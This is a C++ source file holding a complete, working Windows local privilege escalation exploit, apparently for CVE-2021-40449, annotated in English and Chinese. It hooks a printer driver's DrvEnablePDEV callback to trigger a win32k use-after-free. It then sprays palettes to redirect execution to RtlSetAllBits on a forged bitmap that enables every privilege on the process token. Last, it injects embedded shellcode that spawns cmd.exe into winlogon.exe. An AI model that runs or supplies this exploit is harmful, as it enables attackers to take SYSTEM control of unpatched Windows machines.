#pragma warning( disable : 4005 )

#include <Windows.h>
#include <stdio.h>
#include <winddi.h>
#include <winternl.h>
#include <psapi.h>
#include <tlhelp32.h>

// [Shellcode here]
// (Run cmd.exe)
unsigned char payload[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
"\x78\x65\x00";

#define SystemHandleInformation         0x10
#define SystemBigPoolInformation        0x42
#define ThreadNameInformation           0x26

// 定义函数指针
typedef BOOL (*DrvEnableDriver_t)(ULONG iEngineVersion, ULONG cj, DRVENABLEDATA *pded);
typedef DHPDEV (*DrvEnablePDEV_t)(DEVMODEW *pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF *phsurfPatterns, ULONG cjCaps, ULONG *pdevcaps, ULONG cjDevInfo, DEVINFO *pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);
typedef VOID (*VoidFunc_t)();
typedef NTSTATUS(*NtSetInformationThread_t)(HANDLE threadHandle, THREADINFOCLASS threadInformationClass, PVOID threadInformation, ULONG threadInformationLength);
typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);


typedef struct _DriverHook
{
    ULONG index;
    LPVOID func;
} DriverHook;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct
{
    DWORD64 Address;
    DWORD64 PoolSize;
    CHAR PoolTag[4];
    CHAR Padding[4];
} BIG_POOL_INFO, * PBIG_POOL_INFO;

DHPDEV hook_DrvEnablePDEV(DEVMODEW *pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF *phsurfPatterns, ULONG cjCaps, ULONG *pdevcaps, ULONG cjDevInfo, DEVINFO *pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);

DriverHook driverHooks[] = 
{
    {INDEX_DrvEnablePDEV, (LPVOID)hook_DrvEnablePDEV},
};

NtSetInformationThread_t SetInformationThread;
NtQuerySystemInformation_t QuerySystemInformation;

// Global variables
namespace globals
{
    LPWSTR printerName;
    HDC hdc;
    DWORD counter;
    BOOL shouldTrigger;
    VoidFunc_t origDrvFuncs[INDEX_LAST];
    DWORD64 rtlSetAllBits;// 存储RtlSetAllBits地址
    DWORD64 fakeRtlBitMapAddr;// 存储bitmap地址bitmap的buffer里面是自身权限位所在地址
    DWORD currentProcessId;
}

/// <summary>
/// 调色板堆喷
/// </summary>
/// <param name="size"></param>
/// <returns></returns>
VOID SprayPalettes(DWORD size)
{
    /* Spray palettes to reclaim freed memory */

    DWORD palCount = (size - 0x90) / 4;
    DWORD palSize = sizeof(LOGPALETTE) + (palCount - 1) * sizeof(PALETTEENTRY);
    LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palSize);

    if (lPalette == NULL) 
    {
        puts("[-] Failed to create palette");
        return;
    }
    
    // p指向palPalEntry
    DWORD64* p = (DWORD64*)((DWORD64)lPalette + 4);

    // Will call: RtlSetAllBits(BitMapHeader), where BitMapHeader is a forged to point to the current process token (See `CreateForgedBitMapHeader`)
    // This will enable all privileges
    // Offset is specific to each version. Spray the two pointers
    
    // Arg1 (BitMapHeader)
    for (DWORD i = 0; i < 0x120; i++) 
    {
        //填充伪造的PRTL_BITMAP，为RtlSetAllBits作参数
        p[i] = globals::fakeRtlBitMapAddr;
        // p[0xe5] = globals::fakeRtlBitMapAddr;
    }

    // Function pointer (RtlSetAllBits)
    for (DWORD i = 0x120; i < (palSize - 4) / 8; i++) 
    {
        //填充RtlSetAllBits函数的指针
        p[i] = globals::rtlSetAllBits;
        // p[0x15b] = globals::rtlSetAllBits;
    }


    lPalette->palNumEntries = (WORD)palCount;
    lPalette->palVersion = 0x300;

    // Create lots of palettes
    for (DWORD i = 0; i < 0x5000; i++)
    {
        CreatePalette(lPalette);
    }
}

/// <summary>
/// hook 回调函数 DrvEnablePDEV
/// </summary>
/// <param name="pdm"></param>
/// <param name="pwszLogAddress"></param>
/// <param name="cPat"></param>
/// <param name="phsurfPatterns"></param>
/// <param name="cjCaps"></param>
/// <param name="pdevcaps"></param>
/// <param name="cjDevInfo"></param>
/// <param name="pdi"></param>
/// <param name="hdev"></param>
/// <param name="pwszDeviceName"></param>
/// <param name="hDriver"></param>
/// <returns></returns>
DHPDEV hook_DrvEnablePDEV(DEVMODEW *pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF *phsurfPatterns, ULONG cjCaps, ULONG *pdevcaps, ULONG cjDevInfo, DEVINFO *pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver)
{
    puts("[*] Hooked DrvEnablePDEV called");

    //执行原来的回调，确保功能不受影响
    DHPDEV res = ((DrvEnablePDEV_t)globals::origDrvFuncs[INDEX_DrvEnablePDEV])(pdm, pwszLogAddress, cPat, phsurfPatterns, cjCaps, pdevcaps, cjDevInfo, pdi, hdev, pwszDeviceName, hDriver);

    // Check if we should trigger the vulnerability
    //只执行一次 恶意代码避免死循环
    if (globals::shouldTrigger == TRUE)
    {
        globals::shouldTrigger = FALSE;

        // Trigger vulnerability with second ResetDC. 
        // This will destroy the original device context, while we're still inside of the first ResetDC. 
        // This will result in a UAF
        //再次执行ResetDC并传入相同HDC句柄，会释放HDC对应的DC对象 造成free
        puts("[*] Triggering UAF with second ResetDC");
        HDC tmp_hdc = ResetDCW(globals::hdc, NULL);
        puts("[*] Returned from second ResetDC");

        // This is where we reclaim the freed memory and overwrite the function pointer
        // and argument. We will use palettes to reclaim the freed memory

        puts("[*] Spraying palettes");
        //堆喷
        SprayPalettes(0xe20);

        puts("[*] Done spraying palettes");
    }

    return res;
}

/// <summary>
/// hook用户模式的回调，会覆盖原有的回调表中的函数指针
/// </summary>
/// <returns></returns>
BOOL SetupUsermodeCallbackHook()
{
    /* Find and hook a printer's usermode callbacks */

    DrvEnableDriver_t DrvEnableDriver;
    VoidFunc_t DrvDisableDriver;
    DWORD pcbNeeded, pcbReturned, lpflOldProtect, _lpflOldProtect;
    PRINTER_INFO_4W *pPrinterEnum, *printerInfo;
    HANDLE hPrinter;
    DRIVER_INFO_2W *driverInfo;
    HMODULE hModule;
    DRVENABLEDATA drvEnableData;
    BOOL res;

    // Find available printers
    //查找可用的打印机，确定要申请多大内存存放
    EnumPrintersW(PRINTER_ENUM_LOCAL, NULL, 4, NULL, 0, &pcbNeeded, &pcbReturned);
    if (pcbNeeded <= 0)
    {
        puts("[-] Failed to find any available printers");
        return FALSE;
    }

    pPrinterEnum = (PRINTER_INFO_4W *)malloc(pcbNeeded);
    if (pPrinterEnum == NULL)
    {
        puts("[-] Failed to allocate buffer for pPrinterEnum");
        return FALSE;
    }

    // 枚举所有可用的打印机、打印服务器，域或者打印服务提供者存放到缓冲区
    res = EnumPrintersW(PRINTER_ENUM_LOCAL, NULL, 4, (LPBYTE)pPrinterEnum, pcbNeeded, &pcbNeeded, &pcbReturned);
    if (res == FALSE || pcbReturned <= 0)
    {
        puts("[-] Failed to enumerate printers");
        return FALSE;
    }

    // Loop over printers
    // 循环遍历设置回调
    for (DWORD i = 0; i < pcbReturned; i++)
    {
        printerInfo = &pPrinterEnum[i];

        printf("[*] Using printer: %ws\n", printerInfo->pPrinterName);

        // Open printer
        // 返回打印机句柄
        res = OpenPrinterW(printerInfo->pPrinterName, &hPrinter, NULL);
        if (!res)
        {
            puts("[-] Failed to open printer");
            continue;
        }
        printf("[+] Opened printer: %ws\n", printerInfo->pPrinterName);
        
        // 拷贝打印机名字字符串到全局命名空间的变量内
        globals::printerName = _wcsdup(printerInfo->pPrinterName);

        // Get the printer driver
        //获取对应的驱动信息 获取两次，第一次是大小
        GetPrinterDriverW(hPrinter, NULL, 2, NULL, 0, &pcbNeeded);
        driverInfo = (DRIVER_INFO_2W *)malloc(pcbNeeded);
        res = GetPrinterDriverW(hPrinter, NULL, 2, (LPBYTE)driverInfo, pcbNeeded, &pcbNeeded);
        if (res == FALSE)
        {
            printf("[-] Failed to get printer driver\n");
            continue;
        }

        // 打印对应的驱动dll路径
        printf("[*] Driver DLL: %ws\n", driverInfo->pDriverPath);

        // Load the printer driver into memory
        // 载入对应的驱动dll
        hModule = LoadLibraryExW(driverInfo->pDriverPath, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
        if (hModule == NULL)
        {
            printf("[-] Failed to load printer driver\n");
            continue;
        }

        // Get printer driver's DrvEnableDriver and DrvDisableDriver
        // 从驱动dll中获取DrvEnableDriver函数地址、DrvDisableDriver函数地址
        DrvEnableDriver = (DrvEnableDriver_t)GetProcAddress(hModule, "DrvEnableDriver");
        DrvDisableDriver = (VoidFunc_t)GetProcAddress(hModule, "DrvDisableDriver");
        if (DrvEnableDriver == NULL || DrvDisableDriver == NULL)
        {
            printf("[-] Failed to get exported functions from driver\n");
            continue;
        }

        // Call DrvEnableDriver to get the printer driver's usermode callback table
        // 获取目标打印机驱动的回调表
        res = DrvEnableDriver(DDI_DRIVER_VERSION_NT4, sizeof(DRVENABLEDATA), &drvEnableData);
        if (res == FALSE)
        {
            printf("[-] Failed to enable driver\n");
            continue;
        }

        puts("[+] Enabled printer driver");

        // Unprotect the driver's usermode callback table, such that we can overwrite entries
        //设置用户回调表保护权限，使之可以修改回调表
        res = VirtualProtect(drvEnableData.pdrvfn, drvEnableData.c * sizeof(PFN), PAGE_READWRITE, &lpflOldProtect);
        if (res == FALSE)
        {
            puts("[-] Failed to unprotect printer driver's usermode callback table");
            continue;
        }

        // Loop over hooks
        // 循环遍历想要设置的自定义函数
        for (DWORD i = 0; i < sizeof(driverHooks) / sizeof(DriverHook); i++)
        {
            // Loop over driver's usermode callback table
            // 遍历回调表并覆盖里面的函数指针
            for (DWORD n = 0; n < drvEnableData.c; n++)
            {
                ULONG iFunc = drvEnableData.pdrvfn[n].iFunc;

                // Check if hook INDEX matches entry INDEX
                if (driverHooks[i].index == iFunc)
                {
                    // Saved original function pointer 保存原来的函数指针
                    globals::origDrvFuncs[iFunc] = (VoidFunc_t)drvEnableData.pdrvfn[n].pfn;
                    // Overwrite function pointer with hook function pointer  覆盖函数指针
                    drvEnableData.pdrvfn[n].pfn = (PFN)driverHooks[i].func;
                    break;
                }
            }
        }

        // Disable driver
        DrvDisableDriver();

        // Restore protections for driver's usermode callback table
        VirtualProtect(drvEnableData.pdrvfn, drvEnableData.c * sizeof(PFN), lpflOldProtect, &_lpflOldProtect);

        return TRUE;
    }

    return FALSE;
}

/// <summary>
/// 获取内核基址
/// </summary>
/// <returns></returns>
DWORD64 GetKernelBase()
{
    /* Get kernel base address of ntoskrnl.exe */

    DWORD lpcbNeeded;
    BOOL res;
    DWORD64 *deviceDrivers;
    DWORD64 kernelBase;

    // Get device drivers will return an array of pointers
    // Requires at least medium integrity level
    res = EnumDeviceDrivers(NULL, 0, &lpcbNeeded);

    deviceDrivers = (DWORD64*)malloc(lpcbNeeded);

    res = EnumDeviceDrivers((LPVOID*)deviceDrivers, lpcbNeeded, &lpcbNeeded);

    if (res == FALSE) 
    {
        return NULL;
    }

    // First entry matches ntoskrnl.exe
    kernelBase = deviceDrivers[0];

    free(deviceDrivers);

    return kernelBase;
}

/// <summary>
/// 获取内核中的指针
/// </summary>
/// <param name="handle"></param>
/// <param name="type"></param>
/// <returns></returns>
DWORD64 GetKernelPointer(HANDLE handle, DWORD type)
{
    /* Get kernel address for handle */

    PSYSTEM_HANDLE_INFORMATION buffer;
    DWORD objTypeNumber, bufferSize;
    DWORD64 object;

    buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);
    bufferSize = 0x20;

    // Query handle information. This will query information for all handles on the system
    // Requires at least medium integrity level
    //这里当我们传入的变量为SystemHandleInformation的时候，返回的变量为SYSTEM_HANDLE_INFORMATION，具体定义如下
    /*
    typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
    {
	    ULONG ProcessId;          // 当前对象从属的进程id
	    UCHAR ObjectTypeNumber;   // 表示当前对象的类型
	    UCHAR Flags;
	    USHORT Handle;            // 当前句柄
	    void* Object;             // 句柄所对应的真正object的地址
	    ACCESS_MASK GrantedAccess;
    } SYSTEM_HANDLE, *PSYSTEM_HANDLE;


    typedef struct _SYSTEM_HANDLE_INFORMATION
    {
	    ULONG NumberOfHandles;
	    SYSTEM_HANDLE Handels[1];
    } SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
    
    
    */
    NTSTATUS status = QuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, bufferSize, &bufferSize);

    if (status == (NTSTATUS)0xC0000004L)
    {
        // Buffer too small. This is always the case, since we only alloc room 0x20 bytes
        // initially, but we're receiving information for all handles on the system.
        // But if we don't allocate a buffer initially, it will fail for some reason.
        free(buffer);
        buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(bufferSize);
        status = QuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, bufferSize, &bufferSize);
    }

    if (buffer == NULL || status != 0)
    {
        return 0;
    }

    // Loop over the handles
    //通过调用这个函数，能够拿到当前进程中所有打开的句柄。于是我们通过检查句柄类型，找到当前进程中使用的TOKEN的句柄
    for (size_t i = 0; i < buffer->NumberOfHandles; i++)
    {
        objTypeNumber = buffer->Handles[i].ObjectTypeIndex;

        // Check if process ID matches current process ID and if object type matches the provided object type
        if (buffer->Handles[i].UniqueProcessId == globals::currentProcessId && buffer->Handles[i].ObjectTypeIndex == type)
        {
            // Check if handle value matches
            if (handle == (HANDLE)buffer->Handles[i].HandleValue)
            {
                // Match. The kernel address will be in `Object`
                object = (DWORD64)buffer->Handles[i].Object;
                free(buffer);
                return object;
            }
        }
    }
    
    puts("[-] Could not find handle");
    free(buffer);
    
    return 0;
}

/// <summary>
/// 获取进程令牌地址
/// </summary>
/// <returns></returns>
DWORD64 GetProcessTokenAddress() 
{
    /* Get kernel address of current process token */

    HANDLE proc, token;
    DWORD64 tokenKernelAddress;

    // Get handle for current process
    proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, globals::currentProcessId);
    if (proc == NULL) {
        puts("[-] Failed to open current process");
        return 0;
    }

    // Get handle for current process token
    if (OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token) == FALSE)
    {
        puts("[-] Failed to open process token");
        return 0;
    }

    // Get kernel address for current process token handle
    for (DWORD i = 0; i < 0x100; i++) {
        // Sometimes GetKernelPointer will fail for some reason
        // Mostly only on the the iteration
        
        tokenKernelAddress = GetKernelPointer(token, 0x5);//于是这里通过给GetKernelPointer传入0x5，获取到这个TOKEN对象的真正的地址。

        if (tokenKernelAddress != 0) {
            break;
        }
    }

    if (tokenKernelAddress == 0) {
        puts("[-] Failed to get token kernel address");
        return 0;
    }

    return tokenKernelAddress;
}


/// <summary>
/// NtSetInformationThread，绕过SMAP
/// </summary>
/// <param name="token"></param>
/// <returns></returns>
DWORD64 CreateForgedBitMapHeader(DWORD64 token)
{
    /* Create a forged BitMapHeader on the large pool to be used in RtlSetAllBits */

    // Cool trick taken from:
    // https://github.com/KaLendsi/CVE-2021-40449-Exploit/blob/main/CVE-2021-40449-x64.cpp#L448
    // https://gist.github.com/hugsy/d89c6ee771a4decfdf4f088998d60d19

    DWORD dwBufSize, dwOutSize, dwThreadID, dwExpectedSize;
    HANDLE hThread;
    USHORT dwSize;
    LPVOID lpMessageToStore, pBuffer;
    UNICODE_STRING target;
    HRESULT hRes;
    ULONG_PTR StartAddress, EndAddress, ptr;
    PBIG_POOL_INFO info;

    // 新建线程获取对应的句柄
    hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)NULL, 0, CREATE_SUSPENDED, &dwThreadID);

    dwSize = 0x1000;
    
    // 申请空间，当作bitmap结构
    lpMessageToStore = VirtualAlloc(0, dwSize, MEM_COMMIT, PAGE_READWRITE);

    memset(lpMessageToStore, 0x41, 0x20);

    /*
    BitMap结构
    typedef struct _RTL_BITMAP {
        ULONG  SizeOfBitMap;
        ULONG *Buffer;
    } RTL_BITMAP, *PRTL_BITMAP;
     */

    // BitMapHeader->SizeOfBitMap
    *(DWORD64*)lpMessageToStore = 0x80;

    // BitMapHeader->Buffer 为令牌地址
    *(DWORD64*)((DWORD64)lpMessageToStore + 8) = token;

    target = {};

    target.Length = dwSize;
    target.MaximumLength = 0xffff;
    target.Buffer = (PWSTR)lpMessageToStore;

    // 当NtSetInformationThread传入的flag为0先6时将在内核设置Thread Name属性，会在内核申请sizeof(UNICODE_STRING)+sizeof(UNICODE_STRING.Buffer)大小的堆空间，并且其tag为ThNm
    // 参考 https://blahcat.github.io/2019/03/17/small-dumps-in-the-big-pool/
    hRes = SetInformationThread(hThread, (THREADINFOCLASS)ThreadNameInformation, &target, 0x10);

    dwBufSize = 1024 * 1024;
    pBuffer = LocalAlloc(LPTR, dwBufSize);
    /*
     查询进程拥有的大堆，使用pBuffer存放
     pBuffer结构为
     pBuffer结构如下，AllocatedInfo为SYSTEM_BIGPOOL_ENTRY的数组，大小为进程拥有的BigPool数目
     typedef struct _SYSTEM_BIGPOOL_ENTRY {
        union {
            PVOID     VirtualAddress;
            ULONG_PTR NonPaged : 1;
        };
        ULONG_PTR SizeInBytes;
        union {
            UCHAR Tag[4];
            ULONG TagUlong;
        };
    } SYSTEM_BIGPOOL_ENTRY, *PSYSTEM_BIGPOOL_ENTRY;
    typedef struct
    {
        ULONG                Count;
        SYSTEM_BIGPOOL_ENTRY AllocatedInfo[anysize_of_array];
    } SYSTEM_BIGPOOL_INFORMATION, *PSYSTEM_BIGPOOL_INFORMATION;
    参考https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/bigpool.htm
    */
    hRes = QuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemBigPoolInformation, pBuffer, dwBufSize, &dwOutSize);

    dwExpectedSize = target.Length + sizeof(UNICODE_STRING);

    StartAddress = (ULONG_PTR)pBuffer;
    // StartAddress + 8 为SYSTEM_BIGPOOL_ENTRY数组偏移
    EndAddress = StartAddress + 8 + *((PDWORD)StartAddress) * sizeof(BIG_POOL_INFO);
    ptr = StartAddress + 8;
    // 开始遍历SYSTEM_BIGPOOL_ENTRY数组
    while (ptr < EndAddress)
    {
        info = (PBIG_POOL_INFO)ptr;

        if (strncmp(info->PoolTag, "ThNm", 4) == 0 && dwExpectedSize == info->PoolSize)
        {
            return (((ULONG_PTR)info->Address) & 0xfffffffffffffff0) + sizeof(UNICODE_STRING);
        }
        ptr += sizeof(BIG_POOL_INFO);
    }

    printf("[-] Failed to leak pool address for forged BitMapHeader\n");

    return NULL;
}

/// <summary>
/// 获取一些api地址做前期准备
/// </summary>
/// <returns></returns>
BOOL Setup() 
{
    DWORD64 kernelBase, tokenKernelAddress, rtlSetAllBitsOffset;
    HMODULE kernelModule, ntdllModule;

    ntdllModule = LoadLibraryW(L"ntdll.dll");
    if (ntdllModule == NULL) 
    {
        puts("[-] Failed to load NTDLL");
        return FALSE;
    }

    globals::currentProcessId = GetCurrentProcessId();

    //获取api地址
    SetInformationThread = (NtSetInformationThread_t)GetProcAddress(ntdllModule, "NtSetInformationThread");
    QuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(ntdllModule, "NtQuerySystemInformation");

    kernelBase = GetKernelBase();//内核基址
    if (kernelBase == NULL) 
    {
        puts("[-] Failed to get kernel base");
        return FALSE;
    }

    kernelModule = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (kernelModule == NULL) 
    {
        puts("[-] Failed to load kernel module");
        return FALSE;
    }

    tokenKernelAddress = GetProcessTokenAddress();//获取进程令牌地址
    if (tokenKernelAddress == 0) 
    {
        puts("[-] Failed to get token kernel address");
        return FALSE;
    }

    //获取api RtlSetAllBits
    rtlSetAllBitsOffset = (DWORD64)GetProcAddress(kernelModule, "RtlSetAllBits");
    if (rtlSetAllBitsOffset == NULL) 
    {
        puts("[-] Failed to find RtlSetAllBits");
        return FALSE;
    }

    globals::rtlSetAllBits = (DWORD64)kernelBase + rtlSetAllBitsOffset - (DWORD64)kernelModule;

    globals::fakeRtlBitMapAddr = CreateForgedBitMapHeader(tokenKernelAddress + 0x40);
    if (globals::fakeRtlBitMapAddr == NULL) 
    {
        puts("[-] Failed to pool leak address of token");
        return FALSE;
    }

    return SetupUsermodeCallbackHook();
}

/// <summary>
/// 注入shellcode进入winlogon
/// </summary>
/// <returns></returns>
VOID InjectToWinlogon()
{
    /* Inject `payload` (shellcode) into winlogon.exe */

    PROCESSENTRY32 entry;
    HANDLE snapshot, proc;

    entry.dwSize = sizeof(PROCESSENTRY32);

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    INT pid = -1;
    if (Process32First(snapshot, &entry))
    {
        while (Process32Next(snapshot, &entry))
        {
            if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0)
            {
                pid = entry.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(snapshot);

    if (pid < 0)
    {
        puts("[-] Could not find winlogon.exe");
        return;
    }

    proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (proc == NULL)
    {
        puts("[-] Failed to open process. Exploit did probably not work");
        return;
    }

    LPVOID buffer = VirtualAllocEx(proc, NULL, sizeof(payload), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (buffer == NULL)
    {
        printf("[-] Failed to allocate remote memory");
    }

    if (!WriteProcessMemory(proc, buffer, payload, sizeof(payload), 0))
    {
        puts("[-] Failed to write to remote memory");
        return;
    }

    HANDLE hthread = CreateRemoteThread(proc, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);

    if (hthread == INVALID_HANDLE_VALUE)
    {
        puts("[-] Failed to create remote thread");
        return;
    }
}


/// <summary>
/// 主函数
/// </summary>
/// <returns></returns>
INT main()
{
    BOOL res = FALSE;

    res = Setup();

    if (res == FALSE) 
    {
        puts("[-] Failed to setup exploit");
        return 0;
    }


    // Create new device context for printer with driver's hooked callbacks
    globals::hdc = CreateDCW(NULL, globals::printerName, NULL, NULL);
    if (globals::hdc == NULL)
    {
        puts("[-] Failed to create device context");
        return -1;
    }

    // Trigger the vulnerability
    // This will internally call `hdcOpenDCW` which will call our usermode callback
    // From here we will call ResetDC again to trigger the UAF
    globals::shouldTrigger = TRUE;
    ResetDC(globals::hdc, NULL);

    // Exploit complete
    // We should now have all privileges

    puts("[*] Spawning remote thread");

    InjectToWinlogon();//注入

    return 0;
}
